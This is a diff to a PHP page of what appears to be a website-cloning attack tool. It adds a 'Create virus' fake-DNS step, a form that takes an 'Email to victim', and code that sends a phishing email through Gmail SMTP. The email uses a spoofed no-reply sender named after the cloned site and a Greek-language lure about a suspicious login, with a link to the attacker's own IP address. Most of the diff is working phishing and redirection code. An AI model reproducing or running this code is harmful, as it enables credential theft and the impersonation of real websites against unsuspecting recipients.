@@ -1,26 +1,3 @@
-<?php
-
-/*
-*  Clonenew is a programm for clone websites.
-*  Copyright (c) 2017 Barchampas Gerasimos.
-*
-*  Clonenew is free software: you can redistribute it and/or modify
-*  it under the terms of the GNU Affero General Public License as published by
-*  the Free Software Foundation, either version 3 of the License, or
-*  (at your option) any later version.
-*
-*  Clonenew is distributed in the hope that it will be useful,
-*  but WITHOUT ANY WARRANTY; without even the implied warranty of
-*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-*  GNU Affero General Public License for more details.
-*
-*  You should have received a copy of the GNU Affero General Public License
-*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
-*
-*/
-
-?>
-
 <html>
 <head>
 
@@ -51,13 +28,13 @@ transform: scale(2);
 
 
     <div class="shell-wrap">
-  <p class="shell-top-bar"> Dns fake generator </p>
+  <p class="shell-top-bar"> Clone site attack method </p>
   
- 
-      <br><br><br><br>
-
 
       <div align="center">
+
+     <h3> 1) Create virus </h3> 
+
     <form action="" method="post">
 
    <select name="fake_dns" id="select_dns" required>
@@ -71,7 +48,7 @@ transform: scale(2);
       </optgroup>
   </select>
     
-       <br><br><br>
+       <br><br>
 
 
       <input type="radio" name="network" value="Lan" checked required> Lan
@@ -79,7 +56,7 @@ transform: scale(2);
       <input type="radio" name="network" value="Wan"> Wan
 
 
-     <br><br><br>
+     <br><br>
 
    <input type="submit" name="submit_dns" value="Fake dns generator" id="submit">
 
@@ -87,22 +64,53 @@ transform: scale(2);
     </div>
 
   
-       <br>   
+        <hr>
+        <br>
  
+     <div align="center">
+
+            <h3> 2) Send to email </h3> 
+
+         <form action="" method="post">
+
+         <input type="radio" name="email_net" value="Lan" checked required> Lan
+         &nbsp; &nbsp; &nbsp; 
+      <input type="radio" name="email_net" value="Wan"> Wan
+
+           <br><br>
+
+  <font color="black">  < </font>
+     <input type="email" name="email" id="email" maxlength="64" placeholder="Email to victim"  required> 
+      <font color="black"> > </font>
+ 
+             <br><br> 
+
+    <input type="submit" name="submit_email_phishing" value="Email Phishing" id="submit">
+         </form>
+      </div>
+       
+        <hr> 
+
+         <br>
 
       <div align="center">
-        <a href="/">
-    <input type="button" value="No fake dns(Normal attack)" id="submit">
-         </a>
-      </div>
+        <h3> 3) Normal attack </h3> 
+               <?php
+              
+                 $url_redirection = shell_exec('shell/./my_ipv4.sh');
+            //echo "<meta http-equiv='refresh' content= '2;URL=http://$url_redirection?login'/>";
  
-   
-    
+            echo "<form action='http://$url_redirection' method='post'>
+                   <input type='submit' name='normal' value='Normal attack' id='submit'>
+                  </form>"; 
+              ?>
+      </div>
 
+  <!--
   <div id="footer">
-   <img src="/css/clone_diagram.jpg" height="300" width="600">
+   <img src="/css/clone_diagram.jpg" height="300" width="500">
    </div>
-
+    -->
 
 
  
@@ -123,25 +131,22 @@ transform: scale(2);
   session_start();
 
 
-  require_once('class_tools.php');
+  require_once('__SRC__/class_tools.php');
 
   if (class_exists('INPUT_DATA_AVAILABLE')) 
-    {
-    $obj_dns = new INPUT_DATA_AVAILABLE;
+      {
+        $obj_dns = new INPUT_DATA_AVAILABLE;
       
 
-
-
    if (isset($_POST['submit_dns']))
-      {
+       {
+
       $fake_dns   =  $obj_dns-> SAFE_DATA_ENTER($_POST['fake_dns']);
       $network    =  $obj_dns-> SAFE_DATA_ENTER($_POST['network']);
  
        if($fake_dns == true)
-        {
-
-
-
+         {
+ 
 
          // Get path from operating system 
 
@@ -345,7 +350,6 @@ transform: scale(2);
 
 
 
-
   echo "<script type='text/javascript'>alert('Fake dns for $fake_dns generated');
          </script>";
           echo ("<script>location.href='/'</script>");
@@ -353,6 +357,126 @@ transform: scale(2);
  
 
        } // end of submit dns
+
+
+
+
+
+
+
+
+
+ 
+     // for sumbit email phishing
+
+     if (isset($_POST['submit_email_phishing']))
+         {
+ 
+        $email_net =  $obj_dns-> SAFE_DATA_ENTER($_POST['email_net']);
+        $email     =  $obj_dns-> SAFE_DATA_ENTER($_POST['email']);
+
+        $ipv4_mail = trim(shell_exec('shell/./my_ipv4.sh'));
+
+        $PublicIP_mail = trim(shell_exec("shell/./my_public_ip.sh")); 
+
+
+
+
+              // Get network type for attack
+
+              if ($email_net == "Lan")
+               {
+                $MyIP_mail = $ipv4_mail;
+                 }
+
+
+             else  if ($email_net == "Wan")
+                 {
+                  $MyIP_mail = $PublicIP_mail;
+                   }
+
+
+
+               // Get clone site name from send link to email 
+        
+             if (isset($_SESSION['site_hack']))             
+                {
+                 $link =  $_SESSION['site_hack'] .'@' .$_SESSION['site_hack'] .'com';
+                  }
+
+
+            if (isset($_SESSION['site_ready']))           
+                {
+                  $str_link  = $_SESSION['site_ready'];
+                  $str_link2 = str_replace("https://www.","",$str_link);
+                  $str_link3 = str_replace(".com","",$str_link2);
+                  $str_link4 = ucfirst($str_link3);
+                  $link =   "no-reply" ."@" .$str_link4 .".com";
+                   }
+
+
+      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
+
+
+
+$mail = new PHPMailer(); // create a new object
+
+$mail->IsSMTP(); // enable SMTP
+
+$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+
+$mail->SMTPAuth = true; // authentication enabled
+
+$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+
+$mail->Host = "smtp.gmail.com";
+
+$mail->Port = 465; // or 587
+
+$mail->IsHTML(true);
+
+$mail->Username = "YOUR_USERNAME";
+
+$mail->Password = "YOUR_PASSWORD";
+
+  $mail->SetFrom($link, $str_link4);
+
+  $mail->FromName = $str_link4;
+
+
+$mail->Subject = "Choose Password";
+
+$mail->Body = "<h3> Εντοπίσαμε ύποπτη απόπειρα σύνδεσης στο λογαριασμό σας με τον κωδικό σας. <br>
+               Ασφαλείστε τον λογαριασμό σας τώρα. </h3> <br><br>
+               <a href='http://$MyIP_mail'><button> Εδώ </button></a>";
+             
+
+$mail->AddAddress("$email");
+
+
+     if ($mail->Send()) 
+        {
+       echo '<script type="text/javascript">alert("Phishing attack Successfully");
+         </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+
+
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+
+
+    } // end isset of email phishing 
+
+
+
+
+
+
 
 
 
